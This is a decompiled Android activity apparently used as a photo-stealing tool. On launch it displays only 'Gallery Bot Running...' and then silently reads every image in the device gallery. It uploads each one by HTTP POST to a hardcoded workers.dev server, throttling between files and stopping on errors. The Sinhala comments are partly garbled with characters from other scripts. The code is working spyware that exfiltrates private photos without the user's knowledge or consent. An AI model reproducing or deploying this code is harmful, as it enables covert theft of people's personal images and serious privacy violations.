package com.example.botapp;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.TextView;
import com.example.botapp.MainActivity$;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Gallery Bot Running...");
        setContentView(tv);
        sendLatestPhoto(CF_URL);
    }

    private void sendLatestPhoto(String targetUrl) {
        new Thread(new MainActivity$.ExternalSyntheticLambda0(this, targetUrl)).start();
    }

    void lambda$sendLatestPhoto$0$com-example-botapp-MainActivity(String targetUrl) {
        try {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {"_data"};
            Cursor cursor = getContentResolver().query(uri, projection, null, null, "date_added DESC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int index = cursor.getColumnIndexOrThrow("_data");
                    String path = cursor.getString(index);
                    if (path != null) {
                        File file = new File(path);
                        // ෆයිල් එක පවතියි නම් සහ ප්‍රමාණය මෙගਾਬাইট 10ට වඩා අඩු නම් පමණක් යැවීම
                        if (file.exists() && file.length() < 10 * 1024 * 1024) {
                            boolean success = uploadImage(targetUrl, file);
                            // සර්වර් එකට බර වැඩිවීම වැළැක්වීමට ෆොටෝ එකක් අතරතුර තත්පර 2ක පරතරයක් තැබීම
                            try {
                                Thread.sleep(2000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            // සර්වර් එකෙන් දෝෂයක් ආවොත් (උදා: 200 නොවීම) ලූප් එක නතර කිරීම
                            if (!success) {
                                break;
                            }
                        }
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // uploadImage වෙනස් වී boolean අගයක් (အောင်မြင်යිද නැද්ද) ලබා දෙන ලෙස සකස් කර ඇත
    private boolean uploadImage(String targetUrl, File file) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            OutputStream out = conn.getOutputStream();
            FileInputStream in = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            while (true) {
                int bytesRead = in.read(buffer);
                if (bytesRead != -1) {
                    out.write(buffer, 0, bytesRead);
                } else {
                    in.close();
                    out.flush();
                    out.close();
                    int responseCode = conn.getResponseCode();
                    // ප්‍රතිචාර කේතය 200 (OK) නම් සාර්ථකයි
                    return responseCode == 200;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
